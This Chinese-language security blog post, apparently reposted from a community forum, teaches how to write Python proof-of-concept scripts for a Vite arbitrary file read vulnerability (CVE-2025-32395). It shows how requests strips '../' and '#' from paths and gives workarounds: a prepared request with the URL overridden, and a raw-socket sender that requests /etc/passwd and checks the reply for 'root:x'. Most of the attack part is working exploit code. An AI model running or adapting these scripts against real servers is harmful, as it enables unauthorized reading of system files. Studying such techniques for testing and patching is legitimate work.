> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkyMDM4NDM5Ng==&mid=2247493032&idx=1&sn=446bce08c989729bf517668ad0f60683

#  python POC发包高级技巧  
jylove  安全洞察知识图谱   2025-06-30 00:27  
  
**免责声明**  
 由于传播、利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号安全洞察知识图谱及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
## 1工具介绍  
### 一 正常发包  
  
刚好最近有个热门的漏洞Vite系列的漏洞，通过该漏洞我们来学习一下  
通过我们用python写POC的时候，我们大部分都是利用python的request的模块来进行发包利用的  
正常情况下都是这样写的POC  

```
response = requests.get(url_base + &#34;/@fs/root/vite-project/?/../../../../../etc/passwd?import&?raw&#34;, proxies=proxies,verify=False,headers=headers)
```

  
其中我们的路径要是比较正常的时候我们通过request模块发包的时候，我们就是能够正常把这个路径发出去的，我们通过bp抓包验证一下  
  
![1698X670/image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/PDVoxXx6RhicGEQtOd3p5iaFt1JhVGxiaSAMpMXLaib8zwcWykHVTzkibr3Qhsv3ic6wzOpemMnq8w9KlD3NfmMrFs7w/640?wx_fmt=png&from=appmsg "")  
  
可以看到bp抓到的路径和我们想发出去的路径是一样的，接下来我们假设我们需要发送的路径是这样的  

```
response = requests.get(url_base + &#34;/../../../../../etc/passwd?import&?raw&#34;, proxies=proxies,verify=False,headers=headers)
```

  
再次使用request模块发包的时候，用bp抓包看下  
  
![1701X696/image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/PDVoxXx6RhicGEQtOd3p5iaFt1JhVGxiaSAyiaV3jmGHTJckeTiaObGseYm42hE0WmJjKxRTnDh5OfibwkfG5WD8Hnyg/640?wx_fmt=png&from=appmsg "")  
  
### 二 进阶发包技巧  
  
我们在bp中抓到的包的路径就是变成了"/etc/passwd?import&?raw"，"/../../"在requests中会被吞噬掉，导致我们无法完成利用，这也是在写POC中经常不注意到的一个点，明明手工利用的是时候可以利用，怎么写脚本的时候不行呢，这种时候就可以bp抓包看看想要发送的数据包是不是跟抓到的一样啦。像这种利用的路径，我们还是得用python来实现时怎么实现呢，干货来了  

```
    check_url=url_base + &#34;/../../../../../etc/passwd&#34;
    s = requests.Session()
    r = requests.Request(method='GET', url=check_url)
    prep = r.prepare()
    prep.url = check_url
result= s.send(prep, verify=False, timeout=10,)
    print result.text
```

  
注意别使用bp代理抓包，经过bp后发送出去的包也是会被吞噬掉“/../../"，我们直接通过wireshark捕获流量验证一下  
  
![1660X603/image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/PDVoxXx6RhicGEQtOd3p5iaFt1JhVGxiaSAtHpZPibdtJMqYClKic0Nwj46RsRt6xI0AYAdqFMQePNCA85lsMm7vHCg/640?wx_fmt=png&from=appmsg "")  
  
可以看到wireshark发包是能正常刚才的方法把这个路径发送出去的"/../../../../../etc/passwd"  
  
而正常的request模块发包模块则变成了"/etc/passwd?import&?raw"  
### 三 高阶发包技巧  
  
接下来我们来看这个漏洞Vite 文件读取漏洞(CVE-2025-32395)  
看官方的POC是这种形式的  
  

```
&#34;/@fs/root/vite-project/#/../../../../../etc/passwd&#34;
```

  
路径中带了#，我们用刚才的两种方式发包测试一下  

```
    方式1：
    lin_response = requests.get(url_base + &#34;/@fs/root/vite-project/#/../../../../../etc/passwd&#34;, proxies=proxies,verify=False,headers=headers)
    方式2：
    check_url=url_base + &#34;/@fs/root/vite-project/#/../../../../../etc/passwd&#34;
    s = requests.session()
    r = requests.Request(method='GET', url=check_url)
    prep = r.prepare()
    prep.url = check_url
result= s.send(prep, verify=False, timeout=10,proxies=proxies)
    print result.text
```

  
通过bp代理和wireshark抓包看下，抓到的包的路径都变成了/@fs/root/vite-project，"/#/../../../../../etc/passwd"这个路径都丢失了，这是因为根据 RFC 3986 标准，# 在 URL 中定义为 片段标识符（Fragment），浏览器和 HTTP 客户端库（如 requests）会默认将其后的内容截断，不会发送到服务端，这意味着：若 # 不编码，其后的路径永远无法到达服务端。所以这个无法通过requests相关脚本来实现  
  
![876X655/image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/PDVoxXx6RhicGEQtOd3p5iaFt1JhVGxiaSAqcsRSLBfyp70ywan0m2YsKkCXZ2s4U1FLlJXsMx0dyHwoV3GK9VGnA/640?wx_fmt=png&from=appmsg "")  
  
![2140X373/image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/PDVoxXx6RhicGEQtOd3p5iaFt1JhVGxiaSAzw5ylf0UJaPjDibxL5bYjoHjKFcm7vMvib22KEz6dlGsib0IH6tCNPDdg/640?wx_fmt=png&from=appmsg "")  
  
接下来就得使用我们的最后一个终极大法了，绕过 HTTP 协议限制，使用原始 Socket 控制：直接通过 socket 库发送字节流，避免高级 HTTP 库（如 urllib2 或 requests）自动处理 #  
  
通过wireshark抓包，看下我们的路径已经完整发出去了，服务器也能完成处理  
  
![2401X357/image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/PDVoxXx6RhicGEQtOd3p5iaFt1JhVGxiaSAIXicwo3EwNmGQKG2R7WsB87zsPeUoyknI1OXNXPlPdBCKbFRaalRicVQ/640?wx_fmt=png&from=appmsg "")  
  
通过回显，我们也能看到漏洞能完成利用  
  
![1288X432/image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/PDVoxXx6RhicGEQtOd3p5iaFt1JhVGxiaSAYecFxZDWDBibayZMdChGQ3gsvopbR5XgykYVDaPgZfpS1noKjJdz4icw/640?wx_fmt=png&from=appmsg "")  
  
关键代码如下  

```
import socket
from urlparse import urlsplit
    parsed_url = urlsplit(url_base)
    netloc = parsed_url.netloc
    paths = [&#34;/@fs/root/vite-project/#/../../../../../etc/passwd&#34;]
if':'in netloc:
        host, port = netloc.split(':', 1)
        port = int(port)
else:
        host = netloc
# 根据协议设置默认端口
if parsed_url.scheme == 'http':
            port = 80
elif parsed_url.scheme == 'https':
            port = 443
else:
            port = None
for path in paths:
        request = (
&#34;GET {path} HTTP/1.1\r\n&#34;
&#34;Host: {host}:{port}\r\n&#34;
&#34;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\r\n&#34;
&#34;Connection: close\r\n&#34;
&#34;\r\n&#34;
        ).format(path=path, host=host,port=port)
# 发送请求
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall(request.encode())
# 接收响应
        response = s.recv(4096)
if&#34;root:x&#34;in response.decode():
print url_base,path,response.decode()
```

### 四 后言  
  
各位还有什么技巧可以分享交流一下的么，大家一起共同进步  
  
转自火线Zone社区，原文作者jylove，如有侵权请联系删除谢谢  
## 2免费社区  
  
安全洞察知识图谱星球是一个聚焦于信息安全对抗技术和企业安全建设的话题社区，也是一个  
**[免费]**  
的星球，欢迎大伙加入积极分享红蓝对抗、渗透测试、安全建设等热点主题  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PDVoxXx6Rh8aia4mibs0I8I42MrYYOSE2DVEpVpPHvxufMGR0yufpgouwIXEl7H5eLm0MgolGFQMDFIrKLTxaYIQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PDVoxXx6RhicGEQtOd3p5iaFt1JhVGxiaSAUYNIF4tgKgmLPuuZJuEQ1iaf1TNcJgiaImlgGb8lxWyf8NGFNkZr3e1A/640?wx_fmt=jpeg&from=appmsg "")  
  
  
